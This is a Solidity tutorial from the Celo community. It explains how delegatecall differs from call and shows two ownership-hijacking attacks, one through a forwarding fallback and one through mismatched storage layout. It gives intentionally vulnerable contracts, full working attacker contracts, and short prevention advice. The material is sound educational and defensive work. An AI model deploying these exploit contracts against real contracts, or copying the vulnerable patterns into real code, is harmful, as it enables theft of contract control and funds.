---
title: Preventing Vulnerabilities in Solidity - Delegate Call
description: Understanding and preventing solidity vulnerabilities
authors:
  - name: ✍️ Oyeniyi Abiola Peace
tags: [celosage, solidity, advanced]
hide_table_of_contents: false
slug: "/tutorials/solidity-vulnerabilities-delegated-call"
---

![header](../../src/data-tutorials/showcase/intermediate/solidity-vulnerabilities-delegated-call.png)

## Introduction

Despite being a fairly new programming language, **Solidity** **is** widely adopted by many developers. It is used to compile the **bytecodes** of many Ethereum smart contracts available today.

However, the downside to its newness is revealed in specific bugs and vulnerabilities affecting users and developers in the past. This article talks about one of these vulnerabilities, and the preventive techniques that can be implemented against it.

## DelegateCall Attack

Before we dive into the concept of the **`DelegateCall`** Attack, we will first discuss how solidity interacts and sends messages to contract functions. In Solidity, there are two low-level interfaces to perform such operations. These interfaces are known as `Call` and `DelegateCall`.

## The Call Interface

The `call` function or opcode sends standard external message calls to contracts. In a call function, the code is executed under the conditions of the external contract/function (caller or receiver). Let us consider the code below to understand how the **call** function works.

```solidity
// CALLEE OR RECEIVER
contract Receiver
{

   uint256  public x;
   function test(uint256 _x) public
   {
             x = _x;
   }
}

// CALLER
contract Caller
{
    uint256 public x;
    function  calltest(address _a) public
    {
       (bool success,) = _a.call(abi.encodeWithSignature("test(uint256)", 45));
                  require(success, "This call was unsuccessful");
    }
}
```

You can copy the code and run it on your editor, or you can deploy it on Remix. Notice that whenever the caller `(Caller -> calltest)` is executed, the “test” gets called, and the value of “x” in the receiver is set to 45.

**NOTE:** you can use the call function to perform operations such as sending gas or ether You just need to pass the required parameters.

## DelegateCall

The `DelegateCall` is quite similar to the **`Call`** opcode/function. The difference is, however, that the code is executed in the context of the caller rather than the `callee`. Another difference is that **`msg.sender`** and **`msg.value`** remains unchanged. Simply put, `DelegateCall` preserves the context of the `caller`. The storage layout for the `caller` and the `receiver` must be the same when using a `DelegateCall`.

This feature of solidity makes it possible for libraries to be implemented so that developers can write reusable code for future contracts. Let’s look at a quick example of `DelegateCall` in solidity.

```solidity
//RECEIVER
contract A
{

   uint256  public x;
   function assignX(uint256 _x) public
   {
             x = _x;
   }
}

// CALLER
contract B
{
    uint256 public x;
            function  callassignX(address _a) public
    {
            (bool success,) = _a.delegatecall(abi.encodeWithSignature("assignX(uint256)", 55));
            require(success, "This Delegate Call was not successful");
    }
}
```

When you deploy the code on Remix or any editor of your choice, and you execute the caller**`, (B -> callassignX)`,** you will notice that `assignX()` gets called and the value of “x” in the receiver is 0, while the value of “x” in the caller is 55.

Although the differences between the `Call` and `DelegateCall` appear to be very simple, the use of `DelegateCall` can lead to unexpected occurrences in your code and give you unpleasant experiences(really, this can give you nightmares if not properly managed.)

For further reading on `call` and `DelegateCall`, see [Solidity Docs](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries) or this [question](https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall) on Ethereum Stack Exchange.

## The Vulnerability Of DelegateCall

Let us explore the vulnerabilities of `DelegateCall`. These vulnerabilities are a result of two key features of `DelegateCall`. These features are

1. The context-preserving nature of `DelegateCall`
2. Ensuring that the storage layout of both the `Caller` and `Receiver` is the same.

### Context Preserving Vulnerability

Let us explore what happens when you forget that `DelegateCall` preserves context. Take a look at this simple example.

```solidity

contract Vulnerable {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}
```

In the above code, `Vulnerable` is a contract that makes use of `DelegateCall` to execute a call. From this code, it does not seem possible for the owner of the `Vulnerable` to be changed. This can, however prove to be false because an attacker can easily take control of the contract. Let us see how that is possible.

The contract sets the owner state variable inside of the constructor. It also contains a fallback function. Let’s have a look at the fallback function.

```solidity
 fallback() external payable {
        address(lib).delegatecall(msg.data); //delegatecalls to lib
    }
```

We can see here that the fallback function makes use of the `DelegatCall`. The fallback simply delegates the call to the state variable `lib`. Harmless, right? We’ll see about that. `lib` is another contract set inside the constructor. Let’s see this.

```solidity
constructor(Lib _lib) {
        owner = msg.sender; //owner variable
        lib = Lib(_lib); //lib is another contract set inside the constructor
    }
```

What does the contract, `lib` do? Let’s take a look.

```solidity
contract Lib {
    address public owner;

    function setowner() public {
        owner = msg.sender;
    }
}
```

From the above code, we can see that the contract `lib` declares a single state variable called `owner`. It also defines a single function called `setowner`. which assigns the value of the `owner` to `msg.sender`. Pretty easy, right?

### How can the owner of the `Vulnerable` contract be changed?

To hijack the `Vulnerable` contract or change its owner, we have to update the `owner` state variable to the hijacker's address. To do this, we must find a way to interact with the `Vulnerable` contract at all costs. This can be achieved by invoking the `fallback` function.

`Fallback` functions are invoked when a function that doesn’t exist inside a particular contract is called.

So, all we have to do is call a function that isn’t within the `Vulnerable` contract.

Let us create a new contract and call it `AttackVulnerable`.

```solidity
contract AttackVulnerable {
    address public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    function attack() public {
        vulnerable.call(abi.encodeWithSignature("setowner()"));
    }
}
```

From the above code, the first thing that is done is to define a variable to store the address of the `Vulnerable` contract. The actual value will be set when the contract is deployed. This value is then passed into the constructor.

```solidity
constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }
```

Inside the contract, we also have a function called `attack()`. This function makes a call to the `vulnerable` contract. It seems harmless, but with a closer look, we can observe that it is trying to call the `setowner()` function which is inside an entirely different contract. The `attack()` function is passing in the function signature of `setowner()` as its `msg.data`

```solidity
function attack() public {
        vulnerable.call(abi.encodeWithSignature("setowner()"));
    }
```

This attempt of the `attack()` function will trigger the `fallback()` function inside the `Vulnerable` contract. If we recall, the `fallback()` function makes a `delegatecall` to the `Lib` contract and sends the `msg.data` to it. But how does this affect the `Vulnerable` contract?

- Since the `fallback` function sends the `msg.data`, which matches the `setowner()` function to the `Lib` contract, the `setowner()` function is called.
- The `setowner()` function then updates the `owner` variable.
- Since the `delegatecall` runs its code using the storage of the `Vulnerable` contract, the `owner` variable that will be updated is the one inside the `Vulnerable` contract.
- The `setowner()` function sets the owner variable to `msg.sender` and since `msg.sender` refers to the caller of `Vulnerable`, in this case, `AttakVulnerable`, the new owner will be `AttackVulnerable`.

Find the full code here:

```solidity
pragma solidity ^0.8.13;
/*
1. OwnerA deploys Lib
2. OwnerA deploys Vulnerable with the address of Lib
3. Attacker deploys AttackVulnerable with the address of Vulnerable
4. Attacker calls AttackVulnerable.attack()
5. Attack is now the owner of Vulnerable
*/

contract Lib {
    address public owner;

    function setowner() public {
        owner = msg.sender;
    }
}

contract Vulnerable {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract AttackVulnerable {
    address public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    function attack() public {
        vulnerable.call(abi.encodeWithSignature("setowner()"));
    }
}
```

### Storage Layout Vulnerability

To get a proper understanding of this vulnerability, we need to know how Solidity stores state variables. Check this [article](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html) to find out about that. Done? Now, let’s move on.

By now, we already know that when a `delegatecall` is used to update storage in Solidity, the state variables have to be declared in the same order. But what happens if we forget to declare the variables in the same order or declare the wrong type? Disastrous things, my friend! Now, let’s find out how this is possible.

First, let us create the two contracts, `Lib` and `Vulnerable`:

```solidity
contract Lib {
    uint public num;

    function performOperation(uint _num) public {
        num = _num;
    }
}

contract Vulnerable {
    address public lib;
    address public owner;
    uint public num;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function performOperation(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("performOperation(uint256)", _num));
    }
}
```

In the above code, we have two contracts. The first contract, `Lib`, defines a state variable called `num`. It also has a function called `performOperation()`. This function simply updates the value of `num`.

In the second contract called `Vulnerable`, three state variables are defined. These are `lib`, `owner`, `num`. The contract assigns the value of `lib` to the address of the `Lib` contract. It also sets the value of `owner` to `msg.sender`. Both of these operations are done in the constructor. Have a look:

```solidity
 constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }
```

Finally, the `Vulnerable` contract also has a function called `performOperation()` which takes in a unit, just like `Lib.performOperation()`. `Vulnerable.performOperation()` makes a `delegatecall` using the address of the `Lib` contract. Inside the `delegatecall`, it makes a request to the `performOperation()` function inside the `Lib` contract.

Now, let us make some observations. We first notice that the contract `Lib` declares only one state variable, but the contract `Vulnerable` declares three state variables.

This is the weak spot where any attacker will try to start exploiting the contract, `Vulnerable`.

As we did in the last example, let us see how the owner of the `Vulnerable` contract can be hijacked because of this mistake. Take a look at this contract written to attack the `Vulnerable` contract:

```solidity
contract AttackVulnerable {

    address public lib;
    address public owner;
    uint public num;

    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function attack() public {
        vulnerable.performOperation(uint(address(this)));
        vulnerable.performOperation(9);
    }

    // function signature must match Vulnerable.performOperation()
    function performOperation(uint _num) public {
        owner = msg.sender;
    }
}
```

From the above code, our attacker is the contract called `AttackVulnerable`. The first thing we observe is that this contract has three state variables. These variables are in the same layout as the ones in the `Vulnerable` contract. It also has a state variable that holds the address of the `Vulnerable` contract. The actual value of the variable is assigned in the constructor

```solidity
   // The storage layout is the same as Vulnerable
    // This will allow the attacker to correctly update the state variables
    address public lib;
    address public owner;
    uint public num;

  //The state variable to store the address of the contract, Vulnerable
    Vulnerable public vulnerable;

  //constructor
  constructor(Vulnerable _vulnerable) {
          vulnerable = Vulnerable(_vulnerable);
      }
```

Next, the attacker defines a function called `attack()`. In this function, the attacker calls the `performOperation()` function inside the `Vulnerable` contract twice.

```solidity
    function attack() public {
        // override address of lib
        vulnerable.performOperation(uint(address(this)));
        // call the function performOperation() with any number as input.
        vulnerable.performOperation(9);
    }

```

- In the first call, the attacker passes his address as an argument to the `Vulnerable.performOperation()` function.
- However, `Vulnerable.performOperation()` takes a `uint` as its argument. To overcome this, the attacker cleverly casts his address to `uint`.
- When the first call is executed, it will call the `performOperation()` inside the `Vulnerable` contract. The value of `num` will be the address of the attacker casted into a `uint`.
- `Vulnerable.performOperation()` will then `delegatecall` to the `Lib` contract. This will call the `performOperation()` function inside the `Lib` contract.
- Once this function is called, it will proceed to update the state variable inside it. This will set the state variable to the address of the attacker.
- Back inside the `Vulnerable` contract, the first variable will be updated since only the first variable in the `Lib` contract was updated. This is due to how Solidity [stores state variables](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html)
- Since the first variable in the `Vulnerable` contract is the address of the `Lib` contract, the address of the `Lib` contract will be updated to the address of the `AttackVulnerable` contract.

At this point, the execution of the first call is completed. So what happens when the second call, `vulnerable.performOperation(9);` is made? Let’s find out:

- When this is called, it will call the `performOperation()` function inside the `Vulnerable` contract, as expected.
- Remember that the `Vulnerable.performOperation()` function makes a `delegatecall` to the `Lib` contract by using the value stored in the `lib` state variable. However, the value of the `lib` variable has been updated by the previous call. This means the function will make a `delegatecall` to the `AttackVulnerable` contract.
- Once a `delegatecall` has been made to the `AttackVulnerable` contract, the `AttackVulnerable.performOperation()` function is called. Let’s have a quick look at what the function does:

```solidity
    function performOperation(uint _num) public {
        owner = msg.sender;
    }
```

- From the above code, we can see that it updates the `owner` state variable. But in this case, which `owner` state variable is going to be updated?
- Since the whole operation runs inside the context of the `Vulnerable` contract, the `owner` state variable that will be updated is the one inside the `Vulnerable` contract.
- Also, since `msg.sender` is the attacker’s address, `Vulnerable`'s address will be updated to the attacker’s address, making him the new owner of the `Vulnerable` contract.
- Once again, our contract has been hijacked dues to the inappropriate use of `delegatecall`.

## How To Prevent Attacks From DelegateCall

Solidity provides the `Library` keyword that helps to ensure our library contracts are stateless. We could have used a library keyword when writing our `Lib` contract in both examples. Using this, our `Lib` contract would have had to use stateless variables and not be a victim of the attacks.

Generally, always pay careful attention to which context your code runs in. Also, try to use stateless libraries whenever possible.

If you cannot go stateless, ensure that you pay close attention to the layout of all your state variables. As we have seen, neglecting this can be very dangerous.

# About the Author

Oyeniyi Abiola Peace (@iamoracle) is a blockchain software and full-stack developer with over five years of experience in JavaScript, Python, PHP, and Solidity. He is currently the CTO of DFMLab and a DevRel Community Moderator at the Celo Blockchain. When not building or teaching about blockchain, he enjoys reading and spending time with loved ones. You can check my blog at iamoracle.hashnode.dev.
